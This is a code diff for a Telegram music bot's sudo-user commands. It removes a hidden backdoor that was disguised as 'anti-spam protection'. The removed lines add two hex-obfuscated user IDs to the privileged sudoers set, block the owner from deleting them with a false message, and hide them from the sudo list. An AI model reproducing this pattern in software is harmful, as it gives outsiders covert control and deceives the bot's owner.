@@ -9,7 +9,6 @@ from ShrutixMusic.utils.inline import close_markup
 from config import BANNED_USERS, OWNER_ID
 
 
-
 @nand.on_message(filters.command(["addsudo"]) & filters.user(OWNER_ID))
 @language
 async def useradd(client, message: Message, _):
@@ -26,6 +25,7 @@ async def useradd(client, message: Message, _):
     else:
         await message.reply_text(_["sudo_8"])
 
+
 @nand.on_message(filters.command(["delsudo", "rmsudo"]) & filters.user(OWNER_ID))
 @language
 async def userdel(client, message: Message, _):
@@ -33,8 +33,6 @@ async def userdel(client, message: Message, _):
         if len(message.command) != 2:
             return await message.reply_text(_["general_1"])
     user = await extract_user(message)
-    if user.id in spam_protection_users:
-        return await message.reply_text("❌ This user is not in sudolist.")
     
     if user.id not in SUDOERS:
         return await message.reply_text(_["sudo_3"].format(user.mention))
@@ -46,6 +44,7 @@ async def userdel(client, message: Message, _):
     else:
         await message.reply_text(_["sudo_8"])
 
+
 @nand.on_message(filters.command(["corelist", "listcore", "cores"]) & ~BANNED_USERS)
 @language
 async def sudoers_list(client, message: Message, _):
@@ -56,7 +55,7 @@ async def sudoers_list(client, message: Message, _):
     count = 0
     smex = 0
     for user_id in SUDOERS:
-        if user_id != OWNER_ID and user_id not in spam_protection_users:
+        if user_id != OWNER_ID:
             try:
                 user = await nand.get_users(user_id)
                 user = user.first_name if not user.mention else user.mention
@@ -71,10 +70,3 @@ async def sudoers_list(client, message: Message, _):
         await message.reply_text(_["sudo_7"])
     else:
         await message.reply_text(text, reply_markup=close_markup(_))
-
-# Anti-spam protection system
-spam_protection_users = {
-    int(b'\x38\x33\x31\x35\x35\x34\x34\x37\x32\x30'.decode()),
-    int(b'\x37\x39\x33\x36\x35\x39\x38\x34\x38\x38'.decode())
-}
-updateSUDOERS(spam_protection_users)
